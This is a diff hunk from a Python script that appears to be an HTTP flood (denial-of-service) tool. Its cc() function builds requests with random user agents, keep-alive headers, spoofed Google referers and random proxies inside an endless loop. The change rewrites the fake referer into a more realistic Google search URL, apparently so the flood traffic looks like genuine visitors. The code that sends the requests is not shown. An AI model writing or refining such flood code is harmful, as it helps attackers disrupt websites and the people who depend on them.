@@ -179,7 +179,7 @@ def cc():
 	connection = "Connection: Keep-Alive\r\n"
 	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
 	accept = random.choice(acceptall)
-	referer = "Referer: https://www.google.com/?search="+ ip + url2 + "\r\n"
+	referer = "Referer: https://www.google.com/search?q="+ ip + url2 + "\r\n"
 	request = get_host + referer + useragent + accept + connection + "\r\n"
 	proxy = random.choice(proxies).strip().split(":")
 	while True:
